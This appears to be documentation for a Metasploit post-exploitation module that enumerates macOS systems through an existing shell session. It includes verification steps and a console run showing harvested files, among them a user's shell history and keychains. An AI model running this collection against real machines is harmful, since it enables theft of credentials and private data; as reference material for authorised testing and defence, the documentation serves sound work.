## Vulnerable Application

This module gathers basic system information from Mac OS X Tiger (10.4), through Mojave (10.14).

The following information is enumerated:

1. OS
2. Network
3. Bluetooth
4. Ethernet
5. Printers
6. USB
7. Airport
8. Firewall
9. Known Networks
10. Applications
11. Development Tools
12. Frameworks
13. Logs
14. Preference Panes
15. StartUp
16. TCP/UDP Connections
17. Environment Variables
18. Last Boottime
19. Current Activity
20. Process List
21. Users & Groups
22. User history files (`.bash_history`)
23. User keychains (downloaded as well)

## Verification Steps

  1. Start msfconsole
  2. Get a shell, user level is fine
  3. Do: ```use post/osx/gather/enum_osx```
  4. Do: ```set session #```
  5. Do: ```run```
  6. You should have lots of files saved to the logs folder

## Scenarios

### User level shell on OSX 10.14.4

```
msf5 > use post/osx/gather/enum_osx 
msf5 post(osx/gather/enum_osx) > show options

Module options (post/osx/gather/enum_osx):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(osx/gather/enum_osx) > set session 1
session => 1
msf5 post(osx/gather/enum_osx) > run

[*] Running module against MacBook-Pro.nogroup
[*] Saving all data to /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738
[*] 	Enumerating OS
[*] 	Enumerating Network
[*] 	Enumerating Bluetooth
[*] 	Enumerating Ethernet
[*] 	Enumerating Printers
[*] 	Enumerating USB
[*] 	Enumerating Airport
[*] 	Enumerating Firewall
[*] 	Enumerating Known Networks
[*] 	Enumerating Applications
[*] 	Enumerating Development Tools
[*] 	Enumerating Frameworks
[*] 	Enumerating Logs
[*] 	Enumerating Preference Panes
[*] 	Enumerating StartUp
[*] 	Enumerating TCP Connections
[*] 	Enumerating UDP Connections
[*] 	Enumerating Environment Variables
[*] 	Enumerating Last Boottime
[*] 	Enumerating Current Activity
[*] 	Enumerating Process List
[*] 	Enumerating Users
[*] 	Enumerating Groups
[*] Extracting history files
[*] 	History file .bash_history found for h00die
[*] 	Downloading .bash_history
[*] Enumerating and Downloading keychains for h00die
[*] Post module execution completed
msf5 post(osx/gather/enum_osx) > ls -lah /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738
[*] exec: ls -lah /logs/post/enum_osx/MacBook-Pro.nogroup_20190415.5738

total 1.4M
drwxr-xr-x 2 root root 4.0K Apr 15 07:58 .
drwxr-xr-x 3 root root 4.0K Apr 15 07:57 ..
-rw-r--r-- 1 root root 4.2K Apr 15 07:57 Airport.txt
-rw-r--r-- 1 root root  87K Apr 15 07:57 Applications.txt
-rw-r--r-- 1 root root 3.5K Apr 15 07:57 Bluetooth.txt
-rw-r--r-- 1 root root   64 Apr 15 07:58 Current Activity.txt
-rw-r--r-- 1 root root    0 Apr 15 07:57 Development Tools.txt
-rw-r--r-- 1 root root  308 Apr 15 07:58 Environment Variables.txt
-rw-r--r-- 1 root root    0 Apr 15 07:57 Ethernet.txt
-rw-r--r-- 1 root root  129 Apr 15 07:57 Firewall.txt
-rw-r--r-- 1 root root 316K Apr 15 07:58 Frameworks.txt
-rw-r--r-- 1 root root   62 Apr 15 07:58 Groups.txt
-rw-r--r-- 1 root root  414 Apr 15 07:58 h00die_.bash_history.txt
-rw-r--r-- 1 root root   63 Apr 15 07:58 h00die_bash__line_342__usr_bin_security__No_such_file_or_directory
-rw-r--r-- 1 root root 1.3K Apr 15 07:57 Known Networks.txt
-rw-r--r-- 1 root root   32 Apr 15 07:58 Last Boottime.txt
-rw-r--r-- 1 root root 841K Apr 15 07:58 Logs.txt
-rw-r--r-- 1 root root 2.1K Apr 15 07:57 Network.txt
-rw-r--r-- 1 root root  364 Apr 15 07:57 OS.txt
-rw-r--r-- 1 root root 8.8K Apr 15 07:58 Preference Panes.txt
-rw-r--r-- 1 root root  204 Apr 15 07:57 Printers.txt
-rw-r--r-- 1 root root  34K Apr 15 07:58 Process List.txt
-rw-r--r-- 1 root root    0 Apr 15 07:58 StartUp.txt
-rw-r--r-- 1 root root  739 Apr 15 07:58 TCP Connections.txt
-rw-r--r-- 1 root root 4.1K Apr 15 07:58 UDP Connections.txt
-rw-r--r-- 1 root root 1.7K Apr 15 07:57 USB.txt
-rw-r--r-- 1 root root   62 Apr 15 07:58 Users.txt
```

